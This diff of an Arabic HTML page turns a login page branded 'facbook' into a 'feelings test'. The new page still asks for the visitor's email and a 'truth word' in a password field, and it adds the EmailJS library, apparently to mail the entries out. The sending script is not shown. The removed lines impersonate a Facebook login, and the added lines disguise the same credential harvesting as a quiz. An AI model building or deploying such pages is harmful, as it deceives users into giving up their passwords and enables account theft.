@@ -3,28 +3,33 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>تسجيل الدخول</title>
+
+<title>اختبار المشاعر</title>
+
 <link rel="stylesheet" href="style.css">
+
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
 </head>
+
 <body>
 
 <div class="container">
 
     <div class="left">
-        <h1>facbook</h1>
-        <p>
-            قم بتسجيل الدخول للوصول إلى حسابك وإدارة بياناتك بسهولة وأمان.
-        </p>
+        <h1>اختبار</h1>
+        <p>قم بكتابة كلمة الحقيقة الخاصة بك</p>
     </div>
 
     <div class="card">
 
-        <h2>تسجيل الدخول</h2>
+        <h2>شارك الحقيقة</h2>
 
-        <form id="loginForm">
+        <form id="feelingForm">
 
             <div class="input-box">
                 <input type="email" id="email" required>
@@ -32,13 +37,11 @@
             </div>
 
             <div class="input-box">
-                <input type="password" id="password" required>
-                <label>كلمة المرور</label>
+                <input type="password" id="truth" required>
+                <label>كلمة الحقيقة</label>
             </div>
 
-            <button>دخول</button>
-
-            <a href="#">نسيت كلمة المرور؟</a>
+            <button type="submit">إرسال</button>
 
             <div id="msg"></div>
 
@@ -48,7 +51,8 @@
 
 </div>
 
-<script type="module" src="script.js"></script>
+
+<script src="script.js"></script>
 
 </body>
 </html>
